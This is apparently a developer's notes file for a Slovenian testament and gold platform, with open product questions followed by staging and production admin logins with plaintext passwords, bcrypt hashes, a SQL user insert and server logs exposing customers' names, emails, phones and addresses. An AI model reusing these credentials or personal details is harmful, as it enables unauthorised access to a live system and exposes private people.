## Testaments Euro Gold Rate
Where does the Testament Euro Rate comes from?
Ideally it would be scraped from https://www.moro.si, and the the price made better by 1% in both directions. if that will be a problem let me know, ill try to find an API

is it set by any admin or something?
is it fixed?
is it set by an extern system needed to be consulted?

When users are selling their testaments to the systems,
is there not a fee on the transactions as when they send Testaments to someone?

## Admin and Ambassadors
What is the difference between an ambassador and an admin?

## Mails
What is the attachment UPN?

## Documnets
What are the documents needed for the users to be uploaded?
Are all of the user documents required by the system in order to let the users use the whole system?

## Testaments
Is there a limit of heirs for a Will?

Are the conditions for a heir by all the objects stated in the will for every heir?
Or the conditions are for the Testaments Gold or for All the Objects? 
Or for Every single object?

## KYC
Where on the figma can i see

## Market Place
Orders should be approved and then the item realese to the user?

## Money Doubts
For all transactions how the money is transactioned from the user to the system?
or is it aside the system? 

Esto falta en el usuario?
País de nacimiento
-
Fecha de nacimiento
-
Dirección permanente
-
EMSO
-
Número de impuesto
-
Profesión

EMSO should be unique?

---------

## Staging Link
https://d3dnvv4anrgb1h.cloudfront.net/sign-in

## Admin STAGING
email: admin@testaments.si
password: Qwerty#123

## Gold Admin STAGING
email: goldadmin@testaments.si
password: Qwerty#123

--------------------------------------------

## Production link
https://backoffice.testament.si/sign-in

## Admin Production
email: admin@testament.si
password: Qw13RRt90_32

## Gold Admin Production
email: goldadmin@testament.si
password: RRt9_32ewwDP
--------------------------------------------

$2a$10$ij1G3PrRnuUGts.T0cntROdkU4zph9.7LLZgeK9BGuc0Ofrj4sHGq

$2a$10$maZgJy.ctSOtfXeXHfn.MOii1WOSKFRITNNw6Jp0AP1hFBW9RjHga
## Shramba Old password
$2a$10$cpNdVXWffQ4tZxpZOrRfmuukNVhSKfI6vMin4l3z84YIP.DE/nZu.

Qwerty Password
$2a$10$CJdvM2nzw.oSG.WL26dHPeSWbyDlfxSv4700oK43xmfcRb6VCGZgG


INSERT INTO devtestaments.Users
(id, name, lastName, secondLastName, email, phone, mobilephone, isReferred, referralId, referralLink, picture, city, address, state, zipcode, street, suburb, status, birthdate, birthplace, emailVerifiedAt, gender, balance, nextRenewal, emso, tin, career, isVerified, password, createdAt, updatedAt, deletedAt, roleId, membershipId, countryId, stripeCustomerId, suspensionDate, areaCode, payLater)
VALUES(130, NULL, NULL, NULL, 'katja.damij@tadadviser.com', NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL, NULL, 0.0000, NULL, NULL, NULL, NULL, -1, '$2a$10$xsyr9t/csQp9B9TzzYC90.GFF61XLAy007hPRrxhoEgGZ/LU/0MP.', '2024-05-15 08:00:35.000', '2024-05-15 08:00:35.000', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);


ANY /stripe (λ: app)
Authenticating with Minimax...
Authenticated with Minimax successfully!
=====================
Customer with code S5qAghX7G2e9 not found
Customer with code S5qAghX7G2e9 not found
Adding a new customer with data: {
  Name: 'Yuri Kelley',
  Email: 'rodriguezjjaime@hotmail.com',
  Phone: '4921602521',
  Address: 'Anáhuac 294',
  PostalCode: '45050',
  City: 'Guadalajara',
  Country: { ID: 192, Name: 'Slovenia' },
  Currency: { ID: 7, Name: 'EUR' },
  SubjectToVAT: 'N',
  EInvoiceIssuing: 'N',
  Code: 'S5qAghX7G2e9',
  RebatePercent: 0
}
Customer added successfully: S5qAghX7G2e9
=====================
Fetching payment methods...
Payment method found: undefined
Error issuing premium invoice: Payment method not found
(λ: app) RequestId: ba6a3da9-1b90-48cb-86a1-a99c2b1b3202  Duration: 2749.23 ms  Billed Duration: 2750 ms
Failed Minimax: Payment method not found
^C%                                                                                                                                                                                                                               
> npm start

> testaments@1.0.0 start
> nodemon --exec "sls offline start"

[nodemon] 3.1.5
[nodemon] to restart at any time, enter `rs`
[nodemon] watching path(s): *.*
[nodemon] watching extensions: js,mjs,cjs,json
[nodemon] starting `sls offline start`
DOTENV: Loading environment variables from .env:
         - SECRET
         - SECRET_MAILS
         - SECRET_TEMP
         - BREVO_API
         - PRODUCTION
         - FRONT_URL
         - ENVIRONMENT
         - REPORT
         - STRIPE_SECRET_KEY
         - STRIPE_WEBHOOK_SECRET
         - DB_STRING
         - S3_AWS_KEY
         - S3_AWS_PRIVATE_KEY
         - S3_AWS_BUCKET
         - MINIMAX_USERNAME
         - MINIMAX_PASSWORD
         - MINIMAX_CLIENT_ID
         - MINIMAX_CLIENT_SECRET
         - MINIMAX_URL

Starting Offline at stage dev (eu-central-1)

Offline [http for lambda] listening on http://localhost:3002
Function names exposed for local invocation by aws-sdk:
           * app: testaments-dev-app

   ┌───────────────────────────────────────────────────────────────────────┐
   │                                                                       │
   │   ANY | http://localhost:3000/{proxy*}                                │
   │   POST | http://localhost:3000/2015-03-31/functions/app/invocations   │
   │   ANY | http://localhost:3000/                                        │
   │   POST | http://localhost:3000/2015-03-31/functions/app/invocations   │
   │                                                                       │
   └───────────────────────────────────────────────────────────────────────┘

Server ready: http://localhost:3000 🚀


ANY /stripe (λ: app)
Connection has been established successfully.
Authenticating with Minimax...
Authenticated with Minimax successfully!
=====================
=====================
Fetching payment methods...
Payment method found: {
  PaymentMethodId: 412535,
  Name: 'STRIPE',
  Type: 'K',
  Usage: 'D',
  Default: 'D'
}
=====================
Fetching items...
Premium item found: {
  ItemId: 9404297,
  Title: 'Testament premium',
  Code: '',
  UnitOfMeasurement: null,
  MassPerUnit: 0,
  ItemType: 'S',
  VatRate: { ID: 36, Name: 'S', ResourceUrl: '/api/orgs/215967/vatrates/36' },
  Price: 58.5,
  Currency: { ID: 7, Name: 'EUR', ResourceUrl: '/api/orgs/215967/currencies/7' },
  RevenueAccountDomestic: {
    ID: 120646227,
    Name: 'Prihodki od prodaje storitev na domačem trgu',
    ResourceUrl: '/api/orgs/215967/accounts/120646227'
  },
  RevenueAccountOutsideEU: {
    ID: 120646235,
    Name: 'Prihodki od prodaje storitev na trgu izven EU',
    ResourceUrl: '/api/orgs/215967/accounts/120646235'
  },
  RevenueAccountEU: {
    ID: 120646234,
    Name: 'Prihodki od prodaje storitev na trgu EU',
    ResourceUrl: '/api/orgs/215967/accounts/120646234'
  },
  StocksAccount: null,
  ProductGroup: null
}
=====================
=====================
Adding a new issued invoice with data: {
  "InvoiceType": "R",
  "Customer": {
    "ID": 16591463,
    "Name": "Yuri Kelley"
  },
  "DocumentNumbering": {
    "ID": 52130
  },
  "DateIssued": "2024-10-09T16:47:12.850Z",
  "DateTransaction": "2024-10-09T16:47:12.850Z",
  "DateDue": "2024-10-09T16:47:12.850Z",
  "IssuedInvoiceRows": [
    {
      "RowNumber": 1,
      "Item": {
        "ID": 9404297,
        "Name": "Testament premium"
      },
      "ItemName": "Testament premium",
      "Description": "Testament premium platform membership",
      "Quantity": 1,
      "UnitOfMeasurement": "unit",
      "Price": 58.5,
      "VatRate": {
        "ID": 36,
        "Name": "S"
      },
      "VATPercent": 22
    }
  ],
  "IssuedInvoicePaymentMethods": [
    {
      "PaymentMethod": {
        "ID": 412535
      },
      "Amount": 58.5,
      "AlreadyPaid": "D"
    }
  ],
  "Employee": {
    "ID": 588854,
    "Name": "NICOLA"
  }
}
Issued invoice added successfully
Searching for customerID: 16591463
Latest issued invoice: {
  IssuedInvoiceId: 41029592,
  InvoiceType: 'R',
  Year: null,
  InvoiceNumber: null,
  Numbering: 'BL-01',
  DocumentNumbering: {
    ID: 52130,
    Name: 'BL-01',
    ResourceUrl: '/api/orgs/215967/document-numbering/52130'
  },
  Customer: {
    ID: 16591463,
    Name: 'Yuri Kelley',
    ResourceUrl: '/api/orgs/215967/customers/16591463'
  },
  DateIssued: '2024-10-09T16:47:12.85',
  DateTransaction: '2024-10-09T00:00:00',
  DateDue: '2024-10-09T00:00:00',
  Currency: { ID: 7, Name: 'EUR', ResourceUrl: '/api/orgs/215967/currencies/7' },
  Analytics: null,
  Status: 'O',
  PaymentStatus: 'Osnutek',
  InvoiceValue: 0,
  PaidValue: 0,
  RecordDtModified: '2024-10-09T18:47:13.14',
  RowVersion: 'AAAABry7fME='
}
Issued premium invoice: {
  IssuedInvoiceId: 41029592,
  InvoiceType: 'R',
  Year: null,
  InvoiceNumber: null,
  Numbering: 'BL-01',
  DocumentNumbering: {
    ID: 52130,
    Name: 'BL-01',
    ResourceUrl: '/api/orgs/215967/document-numbering/52130'
  },
  Customer: {
    ID: 16591463,
    Name: 'Yuri Kelley',
    ResourceUrl: '/api/orgs/215967/customers/16591463'
  },
  DateIssued: '2024-10-09T16:47:12.85',
  DateTransaction: '2024-10-09T00:00:00',
  DateDue: '2024-10-09T00:00:00',
  Currency: { ID: 7, Name: 'EUR', ResourceUrl: '/api/orgs/215967/currencies/7' },
  Analytics: null,
  Status: 'O',
  PaymentStatus: 'Osnutek',
  InvoiceValue: 0,
  PaidValue: 0,
  RecordDtModified: '2024-10-09T18:47:13.14',
  RowVersion: 'AAAABry7fME='
}
=====================
Issuing premium invoice with action: issueAndGeneratepdf
Performing custom action (issueAndGeneratepdf) on issued invoice...
Custom action on the issued invoice: {
  ValidationMessages: [],
  Data: {
    AttachmentId: 132474002,
    AttachmentData: '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'... 63564 more characters,
    AttachmentDate: '2024-10-09T18:47:16.097',
    AttachmentFileName: 'BL-01-2024000001-racun.pdf',
    AttachmentMimeType: 'application/pdf'
  }
}
(λ: app) RequestId: d210bad7-184b-48c7-b9b3-eb2f7add389a  Duration: 7947.16 ms  Billed Duration: 7948 ms
=====================
Issued Invoice: {
  IssuedInvoiceId: 41029592,
  InvoiceType: 'R',
  Year: null,
  InvoiceNumber: null,
  Numbering: 'BL-01',
  DocumentNumbering: {
    ID: 52130,
    Name: 'BL-01',
    ResourceUrl: '/api/orgs/215967/document-numbering/52130'
  },
  Customer: {
    ID: 16591463,
    Name: 'Yuri Kelley',
    ResourceUrl: '/api/orgs/215967/customers/16591463'
  },
  DateIssued: '2024-10-09T16:47:12.85',
  DateTransaction: '2024-10-09T00:00:00',
  DateDue: '2024-10-09T00:00:00',
  Currency: { ID: 7, Name: 'EUR', ResourceUrl: '/api/orgs/215967/currencies/7' },
  Analytics: null,
  Status: 'O',
  PaymentStatus: 'Osnutek',
  InvoiceValue: 0,
  PaidValue: 0,
  RecordDtModified: '2024-10-09T18:47:13.14',
  RowVersion: 'AAAABry7fME='
}


ANY /auth/login (λ: app)
Connection has been established successfully.
(λ: app) RequestId: cf91aabd-df7c-469a-8b86-479341d066e6  Duration: 3474.52 ms  Billed Duration: 3475 ms


ANY /stripe (λ: app)
Authenticating with Minimax...
Authenticated with Minimax successfully!
=====================
=====================
Fetching payment methods...
Payment method found: {
  PaymentMethodId: 412535,
  Name: 'STRIPE',
  Type: 'K',
  Usage: 'D',
  Default: 'D'
}
=====================
Fetching items...
Premium item found: {
  ItemId: 9404297,
  Title: 'Testament premium',
  Code: '',
  UnitOfMeasurement: null,
  MassPerUnit: 0,
  ItemType: 'S',
